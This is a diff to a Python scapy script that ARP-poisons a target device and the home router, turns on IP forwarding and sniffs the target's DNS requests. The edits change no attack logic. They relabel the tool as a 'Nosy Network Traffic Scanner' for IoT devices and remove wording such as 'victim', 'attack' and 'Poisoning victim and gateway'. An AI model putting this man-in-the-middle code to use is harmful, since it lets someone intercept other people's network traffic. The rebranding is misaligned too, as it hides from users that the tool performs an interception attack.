@@ -1,5 +1,3 @@
-#Main code running arp poison to get the traffic
-
 from scapy.all import *
 import threading 
 import os
@@ -47,8 +45,6 @@ def gw_poison():
 
 #DNS Sniffing 
 def sniff_request():
-#  pkts = sniff(iface = INTERFACE, filter = "udp port 53",count = 100, prn=dns_sniff_request)
-# wrpcap("temp.pcap", pkts)
   sniff(iface = INTERFACE, filter = "udp port 53",count = 100, prn=dns_sniff_request)
 
 fieldnames = ["DNS Host", "Bytes"]
@@ -82,37 +78,46 @@ def dns_sniff_request(pkt):
 
 
 #Constant inputs -> Can ask from user also 
-ATTACK_TYPE_SNIFF = 0
+print("Welcome to Nosy Network Traffic Scanner!\n")
+print("Inputs for Router's IP Address and Network Card are *OPTIONAL*")
+print("Press <Enter> button to skip inputs")
+print("Input for IOT's IP Address is *COMPULSORY*\n")
+
 DEFAULT_GATEWAY_IP = "192.168.0.1"
 DEFAULT_INTERFACE = "wlan0"
-GW_IP = DEFAULT_GATEWAY_IP
-INTERFACE = DEFAULT_INTERFACE
-V_IP = raw_input("Put in victim IP Address to attack: ")
-#V_IP = "192.168.0.168"
+GW_IP = raw_input(
+	'Insert Router IP address [Default "' + DEFAULT_GATEWAY_IP + '"]: '
+)
+INTERFACE = raw_input(
+	'Insert the Network [Default "' + DEFAULT_INTERFACE + '"]: '
+)
+V_IP = raw_input("Put in Target IOT's IP Address: ")
 
-print("Obtaining MAC Addresses")
+if GW_IP is None or GW_IP == "":
+	GW_IP = DEFAULT_GATEWAY_IP
+if INTERFACE is None or INTERFACE == "":
+	INTERFACE = DEFAULT_INTERFACE
 
 while True:
   V_MAC = get_MACaddress(V_IP)
   GW_MAC = get_MACaddress(GW_IP)
   if V_MAC is None:
-    print("Cannot find victim MAC Address (" + V_IP + "), retrying...")
+    print("Cannot find IOT MAC Address (" + V_IP + "), retrying...")
   elif GW_MAC is None:
-    print("Cannot find victim MAC Address (" + GW_IP + "), retrying...")
+    print("Cannot find IOT MAC Address (" + GW_IP + "), retrying...")
   else:
     break
 
-print("Attack targets have been found")
 
 #Showing ARP Spoofing targets
-print("Victim: " + V_IP + " (" + V_MAC + ")")
-print("Gateway: " + GW_IP + " (" + GW_MAC + ")")
-print("Poisoning victim and gateway...")
+print("IOT: " + V_IP + " (" + V_MAC + ")")
+print("Home Router: " + GW_IP + " (" + GW_MAC + ")")
 
 os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
 vthread=[]
 gwthread=[]
-print("Showing sniffed traffic...")
+print("Displaying Network Traffic on Graphs")
+print("Press CTRL-C to stop scanning")
 
 
 #Main Program Loop 
